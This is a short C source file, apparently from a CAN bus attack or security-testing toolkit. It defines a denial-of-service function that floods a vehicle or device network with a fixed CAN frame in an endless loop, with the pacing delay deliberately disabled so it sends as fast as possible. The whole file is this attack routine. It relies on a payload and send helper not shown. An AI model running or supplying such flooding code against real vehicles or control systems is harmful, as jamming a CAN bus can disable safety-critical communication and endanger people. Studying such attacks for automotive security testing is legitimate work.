#include "all_headers.h"

void dos_dos(int socket, struct sockaddr_can *addr, int canid, int time_diff) {
    struct can_frame frame;
    frame.can_id = canid;
    frame.can_dlc = 8;
    memcpy(frame.data, dos.payload1, 8);

    while (1) {
        send_can_packet_sendonly(socket, addr, frame.data, frame.can_dlc, frame.can_id);
        //usleep(time_diff);  <<< as fast as possible
    }
}
